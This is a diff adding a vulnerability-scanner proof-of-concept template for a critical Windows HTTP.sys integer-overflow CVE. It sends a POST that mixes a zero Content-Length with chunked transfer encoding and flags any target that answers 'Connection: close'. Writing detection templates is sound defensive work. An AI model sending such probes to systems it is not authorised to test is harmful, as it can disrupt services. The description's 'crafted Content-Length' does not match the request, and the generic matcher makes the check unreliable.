@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "通过发送特制的 HTTP 请求（包含精心构造的 Content-Length 头）触发 HTTP.sys 整数溢出，验证目标是否存在 CVE-2026-47291 漏洞"
+id = "POC-AVE-2026-0086"
+name = "Windows HTTP.sys 整数溢出漏洞 PoC"
+severity = "critical"
+tags = ["ave-2026-0086"]
+vuln_id = [
+    "CVE-2026-47291",
+    "AVE-2026-0086",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+0\r
+\r
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Length = "0"
+Transfer-Encoding = "chunked"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["Connection: close"]
